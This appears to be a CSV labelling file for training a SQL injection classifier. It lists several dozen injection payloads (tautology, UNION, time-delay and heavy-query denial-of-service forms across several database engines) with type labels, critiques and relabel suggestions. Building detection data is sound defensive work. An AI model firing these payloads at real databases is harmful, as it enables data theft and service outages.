payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
select ( case when ( 5418 = 6516 ) then 1 else 5418* ( select 5418 from master..sysdatabases ) end ) --,boolean_blind,mssql,0.7,iif_boolean,RELABEL,reasoning too short (11 chars),boolean_blind,mssql,23903,boolean_blind,mssql,generic SQL keywords without specific signal,boolean_blind,mssql,generic SQL structure without strong signal,select ( case when ( 5418 = 6516 ) then 1 else 5418* ( select 5418 from master..sysdatabases ) end ) --
-7037' ) ) as epsg where 3684 = 3684 union all select 3684--,union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,23904,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,-7037' ) ) as epsg where 3684 = 3684 union all select 3684--
select pg_sleep ( 5 ),time_blind,postgresql,0.9,pg_sleep,RELABEL,reasoning too short (8 chars),time_blind,postgresql,23905,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,select pg_sleep ( 5 )
1' ) where 7903 = 7903,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,23906,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) where 7903 = 7903
"1%' procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",time_blind,mysql,0.9,benchmark,RELABEL,reasoning too short (9 chars); rule-check disagrees: rule says 'error_based' (P4) but labeled 'time_blind' (P5),error_based,mysql,23907,error_based,mysql,Pattern match: 'extractvalue (' → error_based (P4); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1%' procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #"
"1' ) as ssez where 5351 = 5351 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",time_blind,postgresql,0.7,regexp_substring,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,23908,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1' ) as ssez where 5351 = 5351 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --"
-3895' ) or 8645 = 5359--,boolean_blind,generic,0.5,or_equality,RELABEL,reasoning too short (11 chars); confidence too low (0.50),boolean_blind,generic,23909,boolean_blind,generic,Pattern match: 'or 8645 = 5359' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-3895' ) or 8645 = 5359--
"-2120"" ) union all select 9614--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,23910,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-2120"" ) union all select 9614--"
1' ) and 7533 = 7533 and ( 'xyga' like 'xyga,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,23911,boolean_blind,generic,Pattern match: 'and 7533 = 7533' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1' ) and 7533 = 7533 and ( 'xyga' like 'xyga
"1' ) as ssxj where 3845 = 3845 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,0.9,dbms_pipe,RELABEL,reasoning too short (9 chars),time_blind,oracle,23912,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1' ) as ssxj where 3845 = 3845 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --"
"1"" ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ""fkip"" = ""fkip",error_based,mssql,0.9,convert_char,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,23913,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ""fkip"" = ""fkip"
1 ) ) as rroe where 4840 = 4840,union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,23914,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) ) as rroe where 4840 = 4840
"1' ) ) ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( 'vjkf' like 'vjkf",error_based,mysql,0.9,exp_extract,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,23915,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1' ) ) ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( 'vjkf' like 'vjkf"
"1"" ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ""dbxi"" like ""dbxi",time_blind,postgresql,0.7,regexp_substring,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,23916,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1"" ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ""dbxi"" like ""dbxi"
"1"" ) as qmtx where 5280 = 5280 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,mssql,0.7,mssql_sysjoin,RELABEL,reasoning too short (13 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,23917,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) as qmtx where 5280 = 5280 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --"
1%' ) and 2949 = 4847 and ( '%' = ',boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,23918,boolean_blind,generic,Pattern match: 'and 2949 = 4847' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1%' ) and 2949 = 4847 and ( '%' = '
"-1238' ) as lxur where 7075 = 7075 union all select 7075,7075,7075,7075,7075,7075,7075,7075,7075,7075#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,23919,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-1238' ) as lxur where 7075 = 7075 union all select 7075,7075,7075,7075,7075,7075,7075,7075,7075,7075#"
1'|| ( select 'sliy' where 9494 = 9494,union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'union_based' (P7),boolean_blind,generic,23920,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1'|| ( select 'sliy' where 9494 = 9494
-4610' ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( 'hdco' = 'hdco,error_based,oracle,0.9,xmltype_error,RELABEL,reasoning too short (13 chars),error_based,oracle,23921,error_based,oracle,Pattern match: 'xmltype (' → error_based (P4); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal,-4610' ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( 'hdco' = 'hdco
-3966' ) or 7338 = 8657,boolean_blind,generic,0.5,or_equality,RELABEL,reasoning too short (11 chars); confidence too low (0.50),boolean_blind,generic,23922,boolean_blind,generic,Pattern match: 'or 7338 = 8657' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-3966' ) or 7338 = 8657
"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( ( ( 'squj' = 'squj",heavy_query,db2,0.7,db2_sysjoin,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,db2,23923,boolean_blind,db2,generic SQL keywords without specific signal,boolean_blind,db2,generic SQL structure without strong signal,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( ( ( 'squj' = 'squj"
"1%"" ) ) union all select null,null,null,null,null,null--",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,23924,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1%"" ) ) union all select null,null,null,null,null,null--"
"1' ) where 8586 = 8586 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.7,like_randomblob,RELABEL,reasoning too short (15 chars),time_blind,sqlite,23925,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1' ) where 8586 = 8586 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --"
"1 ) ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,oracle,0.7,oracle_sysjoin,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,23926,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1 ) ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --"
-4484' ) ) or 6872 = 6872 and ( ( 'oxuo' = 'oxuo,boolean_blind,generic,0.5,or_equality,RELABEL,reasoning too short (11 chars); confidence too low (0.50),boolean_blind,generic,23927,boolean_blind,generic,Pattern match: 'or 6872 = 6872' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-4484' ) ) or 6872 = 6872 and ( ( 'oxuo' = 'oxuo
"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( ( 7700 = 7700",heavy_query,db2,0.7,db2_sysjoin,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,db2,23928,boolean_blind,db2,generic SQL keywords without specific signal,boolean_blind,db2,generic SQL structure without strong signal,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( ( 7700 = 7700"
"1 ) where 9469 = 9469 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",time_blind,postgresql,0.7,regexp_substring,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,23929,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1 ) where 9469 = 9469 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --"
1 and ( 3020 = 3020 ) *6703,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,23930,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,1 and ( 3020 = 3020 ) *6703
"1"" and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )",error_based,mssql,0.9,mssql_cast,RELABEL,reasoning too short (10 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,23931,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1"" and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )"
"1%"" and 1343 = 5939#",boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,23932,boolean_blind,generic,Pattern match: 'and 1343 = 5939' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","1%"" and 1343 = 5939#"
select pg_sleep ( 5 ) #,time_blind,postgresql,0.9,pg_sleep,RELABEL,reasoning too short (8 chars),time_blind,postgresql,23933,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,select pg_sleep ( 5 ) #
"1"" where 2642 = 2642 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.7,db2_sysjoin,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,db2,23934,boolean_blind,db2,generic SQL keywords without specific signal,boolean_blind,db2,generic SQL structure without strong signal,"1"" where 2642 = 2642 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --"
"1%' ) ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( '%' = '",error_based,mssql,0.9,convert_char,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,23935,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1%' ) ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( '%' = '"
"1"" ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",time_blind,postgresql,0.9,pg_sleep,RELABEL,reasoning too short (8 chars),time_blind,postgresql,23936,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,"1"" ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --"
"-7202%"" ) ) union all select 2901#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,23937,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-7202%"" ) ) union all select 2901#"
"1%' ) ) ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( '%' = '",heavy_query,db2,0.7,db2_sysjoin,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,db2,23938,boolean_blind,db2,generic SQL keywords without specific signal,boolean_blind,db2,generic SQL structure without strong signal,"1%' ) ) ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( '%' = '"
-1280' ) ) or 8571 = 8571--,boolean_blind,generic,0.5,or_equality,RELABEL,reasoning too short (11 chars); confidence too low (0.50),boolean_blind,generic,23939,boolean_blind,generic,Pattern match: 'or 8571 = 8571' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-1280' ) ) or 8571 = 8571--
"1' and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and 'fjfo' = 'fjfo",time_blind,postgresql,0.7,regexp_substring,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,23940,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1' and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and 'fjfo' = 'fjfo"
"1"" ) where 2922 = 2922 or elt ( 6272 = 6272,sleep ( 5 ) ) --",time_blind,mysql,0.7,elt_sleep,RELABEL,reasoning too short (9 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,23941,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"1"" ) where 2922 = 2922 or elt ( 6272 = 6272,sleep ( 5 ) ) --"
"1%"" ) ) ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",time_blind,postgresql,0.7,regexp_substring,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,23942,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1%"" ) ) ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --"
"-9003"" ) ) union all select 9721,9721--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,23943,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-9003"" ) ) union all select 9721,9721--"
1' ) as syer where 3141 = 3141 rlike ( select ( case when ( 6233 = 7567 ) then 1 else 0x28 end ) ) --,time_blind,mysql,0.7,rlike_sleep,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,23944,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)",1' ) as syer where 3141 = 3141 rlike ( select ( case when ( 6233 = 7567 ) then 1 else 0x28 end ) ) --
-2483' where 1327 = 1327 union all select 1327#,union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,23945,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,-2483' where 1327 = 1327 union all select 1327#
"-8699"" ) union all select 8645,8645,8645,8645,8645,8645--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,23946,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-8699"" ) union all select 8645,8645,8645,8645,8645,8645--"
end and ( 'uxzv' = 'uxzv,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,23947,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,end and ( 'uxzv' = 'uxzv
"1"" and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )",heavy_query,mssql,0.7,mssql_sysjoin,RELABEL,reasoning too short (13 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,23948,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1"" and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )"
"1' and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and 'hhbh' = 'hhbh",heavy_query,oracle,0.7,oracle_sysjoin,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,23949,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1' and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and 'hhbh' = 'hhbh"
"1 ) as nfgb where 2503 = 2503 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",error_based,mssql,0.9,mssql_cast,RELABEL,reasoning too short (10 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,23950,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1 ) as nfgb where 2503 = 2503 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --"
"1%"" ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ""%"" = """,time_blind,postgresql,0.7,regexp_substring,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,23951,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1%"" ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ""%"" = """
"1"" ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,0.9,benchmark,RELABEL,reasoning too short (9 chars),time_blind,mysql,23952,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1"" ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #"
"1%' ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",time_blind,postgresql,0.7,regexp_substring,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,23953,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1%' ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --"
select sleep ( 5 ) and ( ( 'uyft' = 'uyft,time_blind,mysql,0.7,sleep_subquery,RELABEL,reasoning too short (14 chars),time_blind,mysql,23954,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,select sleep ( 5 ) and ( ( 'uyft' = 'uyft
-6100' ) as kvfc where 2377 = 2377 or 6872 = 6872--,boolean_blind,generic,0.5,or_equality,RELABEL,reasoning too short (11 chars); confidence too low (0.50),boolean_blind,generic,23955,boolean_blind,generic,Pattern match: 'or 6872 = 6872' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-6100' ) as kvfc where 2377 = 2377 or 6872 = 6872--
